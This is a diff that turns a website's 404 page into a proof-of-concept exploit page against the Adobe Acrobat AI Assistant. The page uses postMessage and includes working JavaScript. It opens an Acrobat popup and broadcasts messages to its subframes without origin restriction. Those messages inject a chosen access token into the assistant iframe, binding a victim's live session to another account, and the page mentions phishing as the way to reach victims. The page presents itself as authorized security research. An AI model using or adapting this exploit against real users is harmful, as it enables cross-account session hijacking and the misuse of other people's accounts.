@@ -7,67 +7,129 @@
     content="script-src 'nonce-aem' 'strict-dynamic' 'unsafe-inline' http: https:; base-uri 'self'; object-src 'none';"
     move-to-http-header="true"
   >
-  <title>Page not found</title>
-  <script nonce="aem" type="text/javascript">
-    window.isErrorPage = true;
-    window.errorCode = '404';
-  </script>
+  <title>Adobe Acrobat AI Assistant — postMessage origin-validation PoC</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <meta property="og:title" content="Page not found">
+  <meta property="og:title" content="Adobe Acrobat AI Assistant — postMessage origin-validation PoC">
   <script nonce="aem" src="/scripts/scripts.js" type="module"></script>
-  <script nonce="aem" type="module">
-    window.addEventListener('load', () => {
-      if (document.referrer) {
-        const { origin, pathname } = new URL(document.referrer);
-        if (origin === window.location.origin) {
-          const backBtn = document.createElement('a');
-          backBtn.classList.add('button', 'error-button-back');
-          backBtn.href = pathname;
-          backBtn.textContent = 'Go back';
-          backBtn.title = 'Go back';
-          const btnContainer = document.querySelector('.button-container');
-          btnContainer.append(backBtn);
-        }
-      }
-    });
-  </script>
-  <script nonce="aem" type="module">
-    import { sampleRUM } from '/scripts/aem.js';
-    sampleRUM('404', { source: document.referrer });
-  </script>
   <link rel="stylesheet" href="/styles/styles.css">
   <style>
-    main.error {
-      min-height: calc(100vh - var(--nav-height));
-      display: flex;
-      align-items: center;
-    }
-
-    main.error .error-number {
-      width: 100%;
-    }
-
-    main.error .error-number text {
-      font-family: monospace;
-    }
+    main.poc { max-width: 760px; margin: 32px auto; padding: 0 16px; font: 14px/1.55 system-ui, sans-serif; }
+    main.poc h1 { font-size: 18px; }
+    main.poc .panel { background: #fff; border: 1px solid #ddd; border-radius: 8px; padding: 16px; margin-bottom: 16px; }
+    main.poc .panel.warn { border-color: #b30000; }
+    main.poc .panel.warn h2 { color: #b30000; }
+    main.poc button { font: 13px system-ui; padding: 8px 12px; margin: 4px 6px 4px 0; border: 1px solid #bbb;
+           border-radius: 6px; background: #fafafa; cursor: pointer; }
+    main.poc button.primary { background: #1473e6; color: #fff; border-color: #1473e6; }
+    main.poc textarea { width: 100%; font: 11px ui-monospace, monospace; box-sizing: border-box; }
+    main.poc code { background: #f0f0f0; padding: 1px 4px; border-radius: 3px; }
+    main.poc #log { font: 12px ui-monospace, monospace; white-space: pre-wrap; background: #0b1021; color: #7CFC9B;
+           padding: 10px; border-radius: 6px; min-height: 160px; max-height: 340px; overflow: auto; }
   </style>
-  <link rel="stylesheet" href="/styles/lazy-styles.css">
 </head>
 
 <body>
   <header></header>
-  <main class="error">
-    <div class="section">
-      <svg viewBox="1 0 38 18" class="error-number">
-        <text x="0" y="17">404</text>
-      </svg>
-      <h2 class="error-message">Page Not Found</h2>
-      <p class="button-container">
-        <a href="/" class="button secondary error-button-home">Go home</a>
-      </p>
+  <main class="poc">
+    <div class="panel">
+      <h1>Security research PoC — ADOBE-OG0PVWYY</h1>
+      <p>This page is hosted at <code id="origin-label"></code>, an origin explicitly listed in the Acrobat AI
+      Assistant iframe's CSP <code>frame-ancestors</code> allowlist. It demonstrates that the assistant's
+      <code>postMessage</code> listener accepts cross-origin messages with no <code>event.origin</code> check,
+      including the <code>adbmsgui_UPDATE_ACCESS_TOKEN</code> handler that sets the assistant's auth token.</p>
+      <p>Authorized testing only — own Adobe test accounts.</p>
+    </div>
+
+    <div class="panel">
+      <h2>Step 1 — reach the victim's live session</h2>
+      <p>Opens <code>acrobat.adobe.com</code> in a new window from this page. If this page is visited in a browser
+      that is already logged into Acrobat (e.g. via a phishing link while the victim has Acrobat open), the new
+      window automatically carries that session's cookies.</p>
+      <button class="primary" id="btnOpen">1. Open Acrobat popup</button>
+      <span id="popupStatus"></span>
+    </div>
+
+    <div class="panel">
+      <h2>Step 2 — sanity check (benign)</h2>
+      <p>Broadcasts <code>adbmsgui_UPDATE_UI_THEME</code> to every subframe of the popup. If the assistant's
+      background flips light/dark, the listener accepted a message from this non-Adobe origin with no origin
+      check.</p>
+      <button id="btnDark">Theme → dark</button>
+      <button id="btnLight">Theme → light</button>
+    </div>
+
+    <div class="panel warn">
+      <h2>Step 3 — cross-account token injection (the impact)</h2>
+      <p>Paste an authorized test account's valid Adobe access token (own accounts only — never a third party's),
+      then broadcast. This reaches the popup's assistant iframe and overwrites its <code>accessToken</code>; the
+      assistant then authenticates <code>POST assistant.adobe.io/api/v2/session</code> with the injected token,
+      binding the victim's live assistant session to whichever account the token belongs to.</p>
+      <textarea id="tok" rows="3" placeholder="Access token to inject (pasted at runtime only — never stored, logged, or sent anywhere else)"></textarea>
+      <button id="btnInject">2. Broadcast UPDATE_ACCESS_TOKEN + START_SERVICE_CONNECTION</button>
+    </div>
+
+    <div class="panel">
+      <h2>Log</h2>
+      <div id="log"></div>
     </div>
   </main>
   <footer></footer>
+
+  <script nonce="aem" type="module">
+    const ACROBAT_URL = "https://acrobat.adobe.com/link/home/";
+    let popup = null;
+
+    const logEl = document.getElementById("log");
+    function log(...a) {
+      const line = "[" + new Date().toLocaleTimeString() + "] " + a.join(" ");
+      logEl.textContent += line + "\n";
+      logEl.scrollTop = logEl.scrollHeight;
+      console.log(line);
+    }
+
+    document.getElementById("origin-label").textContent = location.origin;
+
+    document.getElementById("btnOpen").addEventListener("click", () => {
+      popup = window.open(ACROBAT_URL, "acrobat_poc_" + Date.now(), "width=1200,height=800");
+      if (!popup) { log("! popup blocked — allow popups for this site and retry"); return; }
+      document.getElementById("popupStatus").textContent = " popup opened";
+      log("Opened popup:", ACROBAT_URL);
+    });
+
+    function broadcast(payload) {
+      if (!popup || popup.closed) { log("! no popup open — click Step 1 first"); return; }
+      let n = 0;
+      try {
+        for (let i = 0; i < popup.frames.length; i++) {
+          try { popup.frames[i].postMessage(payload, "*"); n++; } catch (e) {}
+        }
+      } catch (e) { log("! could not read popup.frames:", e.message); return; }
+      log("Broadcast", JSON.stringify(payload).slice(0, 160), "->", n, "subframe(s)");
+    }
+
+    document.getElementById("btnDark").addEventListener("click", () =>
+      broadcast({ msgType: "adbmsgui_UPDATE_UI_THEME", message: "dark" }));
+    document.getElementById("btnLight").addEventListener("click", () =>
+      broadcast({ msgType: "adbmsgui_UPDATE_UI_THEME", message: "light" }));
+
+    document.getElementById("btnInject").addEventListener("click", () => {
+      const t = (document.getElementById("tok").value || "").trim();
+      if (!t) { log("! paste a token first"); return; }
+      broadcast({ msgType: "adbmsgui_UPDATE_ACCESS_TOKEN", message: t });
+      broadcast({ msgType: "adbmsgui_START_SERVICE_CONNECTION", message: { accessToken: t } });
+    });
+
+    window.addEventListener("message", (e) => {
+      const origin = String(e.origin || "");
+      if (origin.includes("assistant.adobe.com") || origin.includes("acrobat.adobe.com")) {
+        let d;
+        try { d = typeof e.data === "string" ? e.data : JSON.stringify(e.data); } catch (_) { d = "[unserializable]"; }
+        log("<- reply from", origin, ":", (d || "").slice(0, 160));
+      }
+    });
+
+    log("PoC page loaded at", location.origin + location.pathname);
+  </script>
 </body>
 
 </html>
